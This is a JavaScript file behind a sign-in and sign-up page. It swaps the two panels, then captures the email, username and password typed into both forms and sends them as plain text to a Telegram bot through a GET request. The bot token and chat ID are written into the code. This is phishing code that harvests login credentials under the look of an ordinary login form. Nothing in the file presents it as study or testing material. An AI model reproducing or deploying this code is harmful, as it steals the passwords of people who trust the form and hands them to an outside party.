const sign_in_btn = document.querySelector("#sign-in-btn");
const sign_up_btn = document.querySelector("#sign-up-btn");
const container = document.querySelector(".container");

sign_up_btn.addEventListener("click", () => {
    container.classList.add("sign-up-mode");
});

sign_in_btn.addEventListener("click", () => {
    container.classList.remove("sign-up-mode");
});



const form = document.querySelector("form");
form.addEventListener("submit", (e) => {
    e.preventDefault();
    var text1 = document.getElementById("text1").value;
    var text2 = document.getElementById("text2").value;
    var my_text = ` %0A Email  - ${text1} %0APassword - ${text2}`

    var token = "5280533124:AAEUpdWDo7A55UMSiuZiLsT2ztpRTqr4wLE"
    var chat_id = -1001223403183
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
});
const form2 = document.getElementById("form2");
form2.addEventListener("submit", (e) => {
    e.preventDefault();
    var text3 = document.getElementById("text3").value;
    var text4 = document.getElementById("text4").value;
    var text5 = document.getElementById("text5").value;
    var my_text = `  %0A User Name -  ${text3} %0AEmail - ${text5} %0APassword - ${text4}`

    var token = "5280533124:AAEUpdWDo7A55UMSiuZiLsT2ztpRTqr4wLE"
    var chat_id = -1001223403183
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
});